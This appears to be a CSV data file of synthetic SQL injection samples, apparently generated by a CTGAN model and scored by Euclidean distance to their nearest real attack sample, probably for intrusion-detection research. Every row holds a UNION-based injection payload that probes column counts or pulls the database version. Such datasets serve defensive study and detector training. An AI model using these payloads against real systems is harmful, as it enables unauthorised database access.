+CTGAN_000191,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000595,5.675709482922227
+CTGAN_000192,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000349,5.179458389093875
+CTGAN_000193,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,6.103822948450698
+CTGAN_000194,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000294,5.814373777921864
+CTGAN_000195,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,3.7292565496126886
+CTGAN_000196,attack,union,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",nearest_attack_euclidean,R000589,5.995594816152352
+CTGAN_000197,attack,union,"-5810 union all select 6307,6307,6307,6307,6307,6307,6307--",nearest_attack_euclidean,R000518,4.501083055899536
+CTGAN_000198,attack,union,"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",nearest_attack_euclidean,R000517,7.042594639192418
+CTGAN_000199,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000190,4.644402810948445
+CTGAN_000200,attack,union,"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",nearest_attack_euclidean,R000352,5.195937646956053
+CTGAN_000201,attack,union,"-1055' union all select 7758,7758,7758,7758,7758,7758--",nearest_attack_euclidean,R000546,5.941099150900901
+CTGAN_000202,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,4.2246938166007695
+CTGAN_000203,attack,union,"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",nearest_attack_euclidean,R000682,6.097138932284382
+CTGAN_000204,attack,union," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000091,6.714123189129705
+CTGAN_000205,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,5.150760092193572
+CTGAN_000206,attack,union," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",nearest_attack_euclidean,R000051,6.313581856033135
+CTGAN_000207,attack,union,"-8491"" where 9043  =  9043 union all select 9043,9043,9043,9043,9043,9043,9043,9043,9043--",nearest_attack_euclidean,R000628,6.217587653906237
+CTGAN_000208,attack,union,"-6360'  )   as yfrk where 3683  =  3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",nearest_attack_euclidean,R000443,4.249378256134283
+CTGAN_000209,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,4.841195317899632
+CTGAN_000210,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000180,5.655061643249557
+CTGAN_000211,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000359,4.354140706914758
+CTGAN_000212,attack,union,"-9256""   )    )    union all select 2977,2977,2977,2977,2977,2977,2977--",nearest_attack_euclidean,R000635,5.000596481181743
+CTGAN_000213,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000359,5.2286532872238505
+CTGAN_000214,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000210,6.777847706971246
+CTGAN_000215,attack,union," select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000135,7.09514225222198
+CTGAN_000216,attack,union,"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",nearest_attack_euclidean,R000442,5.121015408668282
+CTGAN_000217,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000454,5.017100843119837
+CTGAN_000218,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R000644,4.9812668650150655
+CTGAN_000219,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,5.934401218534023
+CTGAN_000220,attack,union,"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",nearest_attack_euclidean,R000517,3.5829350825567925
+CTGAN_000221,attack,union,"-7868' in boolean mode  )   union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#",nearest_attack_euclidean,R000309,3.952330712233013
+CTGAN_000222,attack,union,"-4085'+  (  select aipn where 5493  =  5493 union all select 5493,5493,5493,5493,5493,5493,5493#",nearest_attack_euclidean,R000230,6.041982138881585
+CTGAN_000223,attack,union,"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",nearest_attack_euclidean,R000685,6.400317293130972
+CTGAN_000224,attack,union,"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",nearest_attack_euclidean,R000549,4.100111887063497
+CTGAN_000225,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,6.2527598502545185
+CTGAN_000226,attack,union,"-4305  )   as ldrt where 2567  =  2567 union all select 2567,2567,2567,2567,2567,2567,2567#",nearest_attack_euclidean,R000395,5.584608087094364
+CTGAN_000227,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,7.275927023376909
+CTGAN_000228,attack,union,"-2375 union all select 1573,1573,1573,1573#",nearest_attack_euclidean,R000283,4.265410903782837
+CTGAN_000229,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000319,5.820879305863656
+CTGAN_000230,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000466,5.192575373234725
+CTGAN_000231,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R000514,5.710788534076737
+CTGAN_000232,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000210,5.57496258171821
+CTGAN_000233,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,4.602436399830711
+CTGAN_000234,attack,union,"-9758'+  (  select 'rlcy' where 3691  =  3691 union all select 3691,3691,3691,3691,3691,3691,3691--",nearest_attack_euclidean,R000704,4.147186363378088
+CTGAN_000235,attack,union,"-9558""   )    )     )   union all select 2935,2935,2935,2935,2935--",nearest_attack_euclidean,R000427,5.266616666917794
+CTGAN_000236,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,5.941774182944514
+CTGAN_000237,attack,union," select * from users where id  =  1 or $ 1  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000151,4.694399884941959
+CTGAN_000238,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000157,5.731795216189228
+CTGAN_000239,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000525,5.11078227389747
+CTGAN_000240,attack,union,"-9871 union all select 6094,6094,6094,6094,6094,6094,6094#",nearest_attack_euclidean,R000262,6.193752864758906
+CTGAN_000241,attack,union,"-6597'+  (  select aewz where 4036  =  4036 union all select 4036,4036,4036,4036,4036,4036,4036--",nearest_attack_euclidean,R000229,3.7384322009559767
+CTGAN_000242,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000349,5.135383663948223
+CTGAN_000243,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000527,4.289370802491872
+CTGAN_000244,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R000505,5.860704610024938
+CTGAN_000245,attack,union,"1'+  (  select oqvo where 7448  =  7448 union all select null,null,null,null,null--",nearest_attack_euclidean,R000281,3.8722537214584247
+CTGAN_000246,attack,union,"-5702'   )    )     )   union all select 7806,7806,7806,7806,7806--",nearest_attack_euclidean,R000699,5.089950489941854
+CTGAN_000247,attack,union,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",nearest_attack_euclidean,R000177,4.436826330930549
+CTGAN_000248,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000766,4.901266929593012
+CTGAN_000249,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000425,4.848838700976074
+CTGAN_000250,attack,union,"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",nearest_attack_euclidean,R000685,4.874233636586271
+CTGAN_000251,attack,union,"-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--",nearest_attack_euclidean,R000298,6.213648697052638
+CTGAN_000252,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000210,5.7988622928656985
+CTGAN_000253,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000232,5.160969957169999
+CTGAN_000254,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000474,5.762072916155983
+CTGAN_000255,attack,union,"1'+  (  select 'tzey' where 4491  =  4491 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000553,6.219402345741406
+CTGAN_000256,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000180,4.662975564140427
+CTGAN_000257,attack,union," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",nearest_attack_euclidean,R000051,5.8702002320307285
+CTGAN_000258,attack,union,"-8203""  )   union all select 6394,6394,6394,6394,6394--",nearest_attack_euclidean,R000520,6.045685077389129
+CTGAN_000259,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000144,4.766575820645377
+CTGAN_000260,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R000746,4.780031206119163
+CTGAN_000261,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000178,5.884750846795881
+CTGAN_000262,attack,union,"-8783'   )    )    union all select 4834,4834,4834,4834,4834,4834,4834,4834,4834--",nearest_attack_euclidean,R000569,5.8337089031663805
+CTGAN_000263,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000417,5.988761996611452
+CTGAN_000264,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000178,5.610619038202105
+CTGAN_000265,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000571,6.018617014808001
+CTGAN_000266,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000466,6.116157355731616
+CTGAN_000267,attack,union,"-8566""  )   as hnch where 3418  =  3418 union all select 3418,3418,3418,3418,3418,3418,3418#",nearest_attack_euclidean,R000209,4.982671473047102
+CTGAN_000268,attack,union,"1""   )    )    as yfpl where 4820  =  4820 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000702,5.334896276184447
+CTGAN_000269,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000199,5.027670839742339
+CTGAN_000270,attack,union,"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",nearest_attack_euclidean,R000549,6.1939949478603555
+CTGAN_000271,attack,union,"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",nearest_attack_euclidean,R000442,5.956856558349876
+CTGAN_000272,attack,union,"1   )    )    as bwrg where 3254  =  3254 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000249,4.780729263619467
+CTGAN_000273,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000157,6.037260938304389
+CTGAN_000274,attack,union,"-8007' where 9649  =  9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",nearest_attack_euclidean,R000771,5.500992546145853
+CTGAN_000275,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,5.15441982646031
+CTGAN_000276,attack,union,"-5372""  )   as wlqm where 2432  =  2432 union all select 2432,2432,2432,2432,2432,2432#",nearest_attack_euclidean,R000324,6.5549953717347655
+CTGAN_000277,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000219,3.998812450145402
+CTGAN_000278,attack,union,"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",nearest_attack_euclidean,R000517,7.284987026111255
+CTGAN_000279,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000571,4.641935010649122
+CTGAN_000280,attack,union,"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000458,5.688054248054357
+CTGAN_000281,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000754,6.273625045579993
+CTGAN_000282,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000261,6.5671889449515835
+CTGAN_000283,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R000505,6.228369622017602
+CTGAN_000284,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,6.766823412999611
+CTGAN_000285,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,5.275020836682056
+CTGAN_000286,attack,union,"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",nearest_attack_euclidean,R000738,6.695540634506362
+CTGAN_000287,attack,union,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",nearest_attack_euclidean,R000575,4.059050830017011
+CTGAN_000288,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000474,5.491002959618513
+CTGAN_000289,attack,union,"-7272""  )   union all select 9163,9163,9163,9163,9163,9163,9163--",nearest_attack_euclidean,R000228,5.987959724017938
+CTGAN_000290,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000186,5.0252309893721
+CTGAN_000291,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,6.807928146847465
+CTGAN_000292,attack,union,"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",nearest_attack_euclidean,R000265,5.921041171437363
+CTGAN_000293,attack,union,"-5058%' union all select 6789,6789,6789,6789,6789#",nearest_attack_euclidean,R000355,4.387857910556515
+CTGAN_000294,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000425,4.614145648575803
+CTGAN_000295,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,6.123501269660508
+CTGAN_000296,attack,union," select * from users where id  =  1 union select +!<@,version  (    )   -- 1",nearest_attack_euclidean,R000072,6.553008179780704
+CTGAN_000297,attack,union,"-5160'  )   union all select 8067,8067,8067,8067,8067,8067,8067--",nearest_attack_euclidean,R000751,5.841380651781628
+CTGAN_000298,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.778070003169015
+CTGAN_000299,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,4.317159173598349
+CTGAN_000300,attack,union,"-5160'  )   union all select 8067,8067,8067,8067,8067,8067,8067--",nearest_attack_euclidean,R000751,4.362913871891559
+CTGAN_000301,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000425,5.505780384585814
+CTGAN_000302,attack,union,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",nearest_attack_euclidean,R000711,7.030020821608595
+CTGAN_000303,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,6.316198729369996
+CTGAN_000304,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R000644,5.435296998055463
+CTGAN_000305,attack,union,"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",nearest_attack_euclidean,R000624,5.536626854565954
+CTGAN_000306,attack,union,"-6370'   )    )    as sims where 9388  =  9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",nearest_attack_euclidean,R000260,7.122322992041435
+CTGAN_000307,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R000504,5.782931737466928
+CTGAN_000308,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000559,4.57471862787975
+CTGAN_000309,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000210,6.111735362195786
+CTGAN_000310,attack,union,"-3347'+  (  select xuzs where 1076  =  1076 union all select 1076,1076,1076,1076,1076--",nearest_attack_euclidean,R000325,6.318357293187464
+CTGAN_000311,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,5.50337736673802
+CTGAN_000312,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000408,4.500621890650777
+CTGAN_000313,attack,union,"-8783'   )    )    union all select 4834,4834,4834,4834,4834,4834,4834,4834,4834--",nearest_attack_euclidean,R000569,2.6663865723081863
+CTGAN_000314,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000349,5.450657937311497
+CTGAN_000315,attack,union,"-5058%' union all select 6789,6789,6789,6789,6789#",nearest_attack_euclidean,R000355,4.5540062236437
+CTGAN_000316,attack,union,"1'+  (  select kpso where 1226  =  1226 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000350,5.229735215618684
+CTGAN_000317,attack,union,"-3955%'   )    )    union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",nearest_attack_euclidean,R000205,7.1931818660166496
+CTGAN_000318,attack,union,"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",nearest_attack_euclidean,R000289,4.638746704379494
+CTGAN_000319,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000349,6.0358051569152
+CTGAN_000320,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000556,6.095150973678724
+CTGAN_000321,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000210,4.632606280902202
+CTGAN_000322,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000444,5.390477099899988
+CTGAN_000323,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000542,7.004480534136052
+CTGAN_000324,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000761,7.97028319642348
+CTGAN_000325,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000444,5.134995503556919
+CTGAN_000326,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000466,6.557810372728765
+CTGAN_000327,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,4.657824381089353
+CTGAN_000328,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R000505,4.683970223958617
+CTGAN_000329,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000186,5.058262130995052
+CTGAN_000330,attack,union,"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",nearest_attack_euclidean,R000675,6.232009503958735
+CTGAN_000331,attack,union,-4768'||  (  select 'dded' from dual where 6499  =  6499 union all select 6499--,nearest_attack_euclidean,R000662,6.341021530074773
+CTGAN_000332,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000674,5.093460528869802
+CTGAN_000333,attack,union,"1'+  (  select rwse where 9843  =  9843 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000236,5.2939488311293985
+CTGAN_000334,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000474,5.462049389282823
+CTGAN_000335,attack,union,"-9389' where 5713  =  5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",nearest_attack_euclidean,R000490,5.96908872746589
+CTGAN_000336,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000302,5.266849916439868
+CTGAN_000337,attack,union,"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",nearest_attack_euclidean,R000517,6.26753658563947
+CTGAN_000338,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,4.437817822966
+CTGAN_000339,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000466,4.28945964215037
+CTGAN_000340,attack,union," select * from users where id  =  1 or 1#""1 union select null,version  (    )   -- 1",nearest_attack_euclidean,R000139,7.315902206392498
+CTGAN_000341,attack,union,"-7715'  )   union all select 4830,4830,4830,4830,4830,4830,4830,4830--",nearest_attack_euclidean,R000362,5.717417837923093
+CTGAN_000342,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000761,6.8541460439142945
+CTGAN_000343,attack,union,"1'+  (  select rwse where 9843  =  9843 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000236,6.31093354510387
+CTGAN_000344,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000554,5.4703291492803165
+CTGAN_000345,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000210,7.015544293280756
+CTGAN_000346,attack,union,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#",nearest_attack_euclidean,R000697,6.495955332806776
+CTGAN_000347,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,4.2398531855660915
+CTGAN_000348,attack,union,"-7869%' union all select 2406,2406,2406,2406,2406,2406,2406,2406#",nearest_attack_euclidean,R000718,5.5555258488592605
+CTGAN_000349,attack,union,"-9382'  )   union all select 4774,4774,4774,4774--",nearest_attack_euclidean,R000591,5.588524129783172
+CTGAN_000350,attack,union,"-5702'   )    )     )   union all select 7806,7806,7806,7806,7806--",nearest_attack_euclidean,R000699,5.945610887190728
+CTGAN_000351,attack,union,"-5524  )   as eoyk where 6928  =  6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",nearest_attack_euclidean,R000251,7.416310046252396
+CTGAN_000352,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000169,8.193519834319968
+CTGAN_000353,attack,union,"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",nearest_attack_euclidean,R000265,6.542555401076663
+CTGAN_000354,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000157,6.836904183028092
+CTGAN_000355,attack,union,"-8007' where 9649  =  9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",nearest_attack_euclidean,R000771,7.375170950110072
+CTGAN_000356,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000169,6.14584695038168
+CTGAN_000357,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000300,4.079418813419024
+CTGAN_000358,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000429,4.9737648004365616
+CTGAN_000359,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000186,4.175431980653155
+CTGAN_000360,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000674,6.502309403788604
+CTGAN_000361,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000466,5.236072511459263
+CTGAN_000362,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,4.044727857753617
+CTGAN_000363,attack,union," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000014,6.361046128031141
+CTGAN_000364,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000542,3.4217935304857856
+CTGAN_000365,attack,union,"-1166'   )    )    as icdz where 1042  =  1042 union all select 1042,1042,1042,1042,1042#",nearest_attack_euclidean,R000503,5.718697535023016
+CTGAN_000366,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000554,5.045989498913588
+CTGAN_000367,attack,union,"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",nearest_attack_euclidean,R000549,5.388135172772488
+CTGAN_000368,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000098,7.01052818046076
+CTGAN_000369,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,6.683547303341321
+CTGAN_000370,attack,union,"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",nearest_attack_euclidean,R000288,4.702186712618511
+CTGAN_000371,attack,union," select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000172,7.654499075307632
+CTGAN_000372,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000178,3.8132981867893045
+CTGAN_000373,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000031,7.617740436556438
+CTGAN_000374,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000510,3.0226007543932165
+CTGAN_000375,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000144,7.505538214647771
+CTGAN_000376,attack,union,"-8347%'  )   union all select 7643,7643,7643--",nearest_attack_euclidean,R000776,5.152738695301643
+CTGAN_000377,attack,union,"-1513""  )   as swvd where 2958  =  2958 union all select 2958,2958,2958--",nearest_attack_euclidean,R000382,4.6763343740350765
+CTGAN_000378,attack,union,"1'||  (  select 'tdcr' where 6792  =  6792 union all select null,null,null,null,null#",nearest_attack_euclidean,R000700,4.586301005476441
+CTGAN_000379,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,5.483576962998264
+CTGAN_000380,attack,union,"-6108'  )   union all select 2519,2519,2519,2519--",nearest_attack_euclidean,R000449,6.500473817888542
+CTGAN_000381,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000691,4.502391344536054
+CTGAN_000382,attack,union,"-4707' union all select 4414,4414,4414,4414,4414,4414#",nearest_attack_euclidean,R000586,5.359539889503223
+CTGAN_000383,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,5.95962390114794
